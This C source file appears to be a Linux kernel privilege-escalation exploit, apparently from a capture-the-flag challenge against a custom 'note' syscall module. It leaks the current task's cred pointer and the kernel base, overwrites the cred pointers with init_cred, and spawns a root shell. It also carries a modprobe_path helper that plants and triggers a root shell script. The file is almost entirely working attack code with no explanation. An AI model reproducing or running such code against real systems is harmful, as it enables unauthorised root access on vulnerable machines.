#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

// commands
#define DEV_PATH "/dev/ttp"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /home/user/hax; echo 'setsid cttyhack setuidgid 0 \
           /bin/sh' >> /home/user/hax");
    system("chmod +x /home/user/hax");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /home/user/roooot");
    system("chmod +x /home/user/roooot");
    system("/home/user/roooot");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

#define ADD_NOTE 548
#define DELETE_NOTE 549
#define SHOW_NOTE 550
#define COPY_NOTE 551
#define CURRENT_ADDR 552

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    puts("test");
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

uint64_t leak_cred_addr(uint8_t* buf)
{
    uint64_t* p_buf = (uint64_t*)buf;
    memset(buf, 0x41, 0x408);

    syscall(ADD_NOTE, buf);
    syscall(SHOW_NOTE, buf);

    return p_buf[129];
}

uint64_t leak_kernel_addr(uint8_t* buf, uint64_t current_task, uint64_t old_cred)
{
    uint64_t* p_buf = (uint64_t*)buf;
    memset(buf, 0x41, 0x408);
    int off = 129;

    uint64_t kernel_ptr_addr = current_task + 0xb10;

    printf("Kernel ptr addr: %p \n", kernel_ptr_addr);

    for (int i = 0; i < 3; i++) {
        p_buf[off++] = kernel_ptr_addr - 4;
    }

    syscall(ADD_NOTE, buf);

    uint32_t lower = getuid();

    off = 129;
    for (int i = 0; i < 3; i++) {
        p_buf[off++] = old_cred;
    }

    syscall(ADD_NOTE, buf);

    return  0xffffffff00000000 | lower;
}

void win(uint8_t* buf, uint64_t init_cred)
{
    uint64_t* p_buf = (uint64_t*)buf;
    int off = 129;

    p_buf[off++] = init_cred;
    p_buf[off++] = init_cred;
    p_buf[off++] = init_cred;

    syscall(ADD_NOTE, buf);
    system("/bin/sh");
}

int main(void){
    uint8_t buf[0x440] = {0};
    uint8_t note[0x1000] = {0};

    uint64_t task_struct = syscall(CURRENT_ADDR);
    uint64_t old_cred = leak_cred_addr(note);

    printf("task struct: %p \n", task_struct);
    printf("old cred: %p \n", old_cred);

    if (old_cred == 0) {
        return -1;
    }

   uint64_t k_base = leak_kernel_addr(note, task_struct, old_cred);
   k_base -= 0x144e8a0;

   printf("k_leak: %p \n", k_base);

   uint64_t init_cred = k_base + 0x144eac0;

   win(note, init_cred);

   return 0;
}
